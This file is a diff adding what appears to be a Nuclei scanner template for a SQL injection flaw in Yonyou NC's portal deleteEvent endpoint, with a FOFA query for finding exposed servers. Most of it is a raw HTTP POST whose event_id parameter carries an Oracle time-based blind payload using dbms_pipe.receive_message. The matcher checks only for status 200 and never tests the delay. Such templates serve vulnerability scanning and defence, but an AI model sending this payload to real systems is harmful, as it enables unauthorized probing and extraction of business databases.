@@ -1,0 +1,40 @@
+id: poc-crlh5qkm21phtvfm
+info:
+  name: 用友NC deleteEvent存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/crlh5qkm21phtvfm'
+  tags: sqli,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: crlh5qkm21phtvfm
+    fofa: app="用友-UFIDA-NC"
+http:
+- raw:
+  - 'POST /portal/pt/oacoSchedulerEvents/deleteEvent?pageId=login HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.66 Safari/537.36
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+
+    Accept-Language: zh-CN,zh;q=0.9
+
+    Upgrade-Insecure-Requests: 1
+
+    Cache-Control: max-age=0
+
+    Accept-Encoding: gzip, deflate
+
+    Cookie: JSESSIONID=255CAD868C61636AFF6029E1356C6AFF.ncServer; JSESSIONID=55DEB927A6B17337DC1D14CB52C50B19.ncServer
+
+    Content-Type: application/x-www-form-urlencoded
+
+
+    event_id=-1''AND 1=dbms_pipe.receive_message(''RDS'',5)--+#+&startDate=2025-06-27 12:12:12&event_ts=2025-06-27 12:12:12'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
